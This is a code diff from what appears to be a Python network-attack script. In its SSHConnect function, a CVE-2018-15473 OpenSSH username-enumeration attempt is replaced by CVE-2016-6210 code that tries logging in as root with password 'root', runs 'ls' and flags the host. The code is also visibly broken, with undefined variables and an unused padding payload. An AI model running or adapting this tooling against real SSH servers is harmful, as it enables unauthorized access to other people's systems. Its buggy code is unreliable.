@@ -215,42 +215,24 @@ def TelnetConnect():
 
 def SSHConnect():
 	try:
-#		print('Using CVE:2016-6210')
-#		SSH = paramiko.SSHClient()
-#		p = 'A'*25000
-#		starttime=time.clock()
-#		SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-#		try:
-#			SSH.connect(address, username='root', password='root')
-#			stdin, stdout, stderr = client.exec_command('ls')
-#			for line in stdout:
-#				print('... ' + line.strip('\n'))
-#				client.close()
-#				f.append(address)
-#		except:
-#			endtime=time.clock()
-#			f.append(address)
-#			total=endtime-starttime
-#			print('Possible username root based on enumeration exploit...or timeout...Check Manually!...')
-#			print(total)
+		print('Using CVE:2016-6210')
+		SSH = paramiko.SSHClient()
+		p = 'A'*25000
+		starttime=time.clock()
+		SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 		try:
-			print('Using CVE:2018-15473')
-			SSHsocket = socket.socket()
-			try:
-			    sock.connect((address, 22))#((args.hostname, args.port))
-			except socket.error:
-			    print '[-] Failed to connect'
-			transport = paramiko.transport.Transport(sock)
-			try:
-			    transport.start_client()
-			except paramiko.ssh_exception.SSHException:
-			    print '[-] Failed to negotiate SSH transport'
-			try:
-			    transport.auth_publickey('root', paramiko.RSAKey.generate(2048))
-			except InvalidUsername:
-			    print '[*] Invalid username'
-			except paramiko.ssh_exception.AuthenticationException:
-			    print '[+] Valid username'
+			SSH.connect(address, username='root', password='root')
+			stdin, stdout, stderr = client.exec_command('ls')
+			for line in stdout:
+				print('... ' + line.strip('\n'))
+				client.close()
+				f.append(address)
+		except:
+			endtime=time.clock()
+			f.append(address)
+			total=endtime-starttime
+			print('Possible username root based on enumeration exploit...or timeout...Check Manually!...')
+			print(total)
 	except socket.timeout:
 		print((socket.timeout, '%s timeout SSH or SSH not accessible' % address))
 		g.append(address)
